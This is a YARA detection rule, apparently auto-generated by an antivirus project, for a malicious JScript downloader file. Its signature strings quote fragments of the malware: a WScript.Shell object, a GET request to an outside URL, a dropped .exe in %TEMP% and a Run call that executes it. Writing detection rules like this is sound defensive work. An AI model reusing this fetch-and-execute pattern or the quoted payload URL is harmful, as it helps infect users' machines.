rule sig_20160328_d5372b4db6874b3248e5873c5d8965ea {
  meta:
    description = "datamaliciousorder - file 20160328_d5372b4db6874b3248e5873c5d8965ea.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5909c0502b1d32f920495772853dc0a55832050af52b39ea416d78c2f6541fef"

  strings:
    $s1  = "function Kyndgaow() {return Ryczysm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"6IQwjOcd5ut.exe\";};" fullword ascii
    $s2  = "Vjwhnoyz[Enhmmacihl](\"GET\", \"http://bombers-original.com/mdj6sf\", false);" fullword ascii
    $s3  = "do {WScript[Ppecwcb](Kwfafzlhv() * 11)} while (Vjwhnoyz[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Gwqmrwb(Beaceivi, Ioudwnfwn){return Beaceivi - Ioudwnfwn;};" fullword ascii
    $s5  = "var Ryczysm = function Ghuberkg() {return WScript[Ugkxtp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Peookd() {return ((Kkuwazq == true) && (Kkuwazq == Spknohscz)) ? 1 : Grchxuf;};" fullword ascii
    $s7  = "function Nmdkywybc(Uqdnfowr){Ryczysm[\"Run\"](Uqdnfowr, Grchxuf, Grchxuf);};" fullword ascii
    $s8  = "function Kwfafzlhv(){return 22;};" fullword ascii
    $s9  = "Spknohscz = true; " fullword ascii
    $s10 = "var Spknohscz = false;" fullword ascii
    $s11 = "var Taxlkcyddo = new this[\"Date\"]();" fullword ascii
    $s12 = "function Yssfi(Bogzduaro) {var Aqbjaiey = (1, 2, 3, 4, 5, Bogzduaro); return Aqbjaiey;};" fullword ascii
    $s13 = "Kkuwazq = true; " fullword ascii
    $s14 = "var Chcfowf = false;" fullword ascii
    $s15 = "function Qjcwlipc()" fullword ascii
    $s16 = "return Gwqmrwb(Kcnryiporb, Uklxccqg);" fullword ascii
    $s17 = "function Mmvcfk(){return Ugkxtp;};" fullword ascii
    $s18 = "function Uijlxkliqt(){return Shczhrf;};" fullword ascii
    $s19 = " while (Nfrubvqv){" fullword ascii
    $s20 = "var Kkuwazq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}